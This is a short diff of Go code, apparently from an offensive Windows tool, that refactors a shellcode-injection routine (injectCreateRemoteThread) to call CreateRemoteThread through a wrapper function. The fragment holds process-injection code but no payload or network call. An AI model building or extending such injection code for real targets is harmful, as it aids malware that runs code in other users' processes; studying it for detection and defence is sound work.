@@ -43,16 +43,11 @@ func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
 		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
-	hThread, _, err := api.ProcCreateRemoteThread.Call(
-		uintptr(hProcess),
-		0, 0,
-		addr,
-		0, 0, 0,
-	)
-	if hThread == 0 {
-		return fmt.Errorf("CreateRemoteThread failed: %w", err)
+	hThread, err := CreateRemoteThreadWithCaller(hProcess, addr, 0, nil)
+	if err != nil {
+		return err
 	}
-	windows.CloseHandle(windows.Handle(hThread))
+	windows.CloseHandle(hThread)
 
 	return nil
 }
